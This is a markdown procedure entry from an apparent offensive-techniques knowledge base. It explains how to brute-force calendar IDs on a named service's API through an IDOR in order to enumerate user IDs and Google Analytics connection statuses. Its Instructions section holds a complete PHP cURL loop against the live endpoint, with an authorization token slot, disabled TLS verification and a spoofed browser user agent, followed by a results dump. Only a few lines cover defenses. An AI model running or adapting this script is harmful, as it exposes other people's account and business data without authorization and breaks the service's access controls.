---
tags:
  - bruteforce
  - enumeration
  - idor
type: procedure
tools:
  - '[[tools/PHP]]'
  - '[[tools/cURL]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/php-curl-bruteforce-semrush]]'
  - '[[commands/php-var-dump-results]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:25:34.360Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 5bf2bd60-d676-4a4a-a49b-512f327a70f1
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
  - '[[Valid Accounts]]'
---
# Bruteforce-Calendar-IDs-to-Enumerate-Users-and-Integrations

## Summary

This procedure automates the bruteforcing of calendar_id parameters in the Semrush API to enumerate all calendars, associated user_ids, and their Google Analytics connection statuses, exposing sensitive business data.

## Description

A PHP script loops through a range of calendar_ids (e.g., 10001 to 30000), sends authenticated GET requests via cURL to the vulnerable endpoint, parses the JSON responses for user_id and status, and aggregates results into an array grouped by user_id. This reveals mappings of users to calendars and integration details without ownership verification.

## Requirements

1. PHP environment with cURL extension
2. Valid JWT token for Authorization header
3. Target range of calendar_ids based on observed patterns

## Defense

Defensive measures and detection strategies:

- Implement sequential ID randomization or UUIDs for object references
- Deploy rate limiting and anomaly detection on API endpoints
- Audit logs for high-volume requests to user_status endpoint

## Objectives

1. Collect comprehensive dataset of calendars and users
2. Identify Google Analytics linkages for business intelligence
3. Demonstrate scale of data exposure via IDOR

## Instructions

### Step 1: Initialize Script and Loop

**Context**: Set up the PHP script to iterate over calendar_ids and send requests.

Create a PHP file with a for loop from 30000 down to 10001, initializing cURL for each iteration.

Use [[commands/php-curl-bruteforce-semrush]] inside the loop:

```php
for($I = 30000; $I >= 10001; $I--) { $curl = curl_init(); $opts = [ CURLOPT_URL => 'https://ec.semrush.com/api/v1/ga/user_status/?calendar_id='.$I, CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0', CURLOPT_HTTPHEADER => ['Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.████████.dRNCN9jt0gTvnhYMAzQFGb1HJXVV3Rr72rk_P485THY'], CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_SSL_VERIFYPEER => false ]; curl_setopt_array($curl, $opts); $response = json_decode(curl_exec($curl), true); if(isset($response['id'])) { $array_result[$response['id']][] = [$response['status'], $I]; } curl_close($curl); }
```

> This sends a cURL request for each $I, parses the response, and stores valid results in $array_result.

### Step 2: Output Results

**Context**: Dump the aggregated data for analysis.

After the loop, execute [[commands/php-var-dump-results]]:

```php
var_dump($array_result);
```

Run the full script with `php bruteforce.php`.

> This outputs the array structure showing user_ids and their associated calendars/statuses.

**Expected Output**: array( multiple ) { [user_id]=> array( n ) { [0]=> array(2) { [0]=> string(11) "NON_AUTHORISED" [1]=> int(calendar_id) } ... } }.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery
- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/php-curl-bruteforce-semrush]]
- [[commands/php-var-dump-results]]

## Tools Used

- [[tools/PHP]]
- [[tools/cURL]]

## Tags

- bruteforce
- data-enumeration
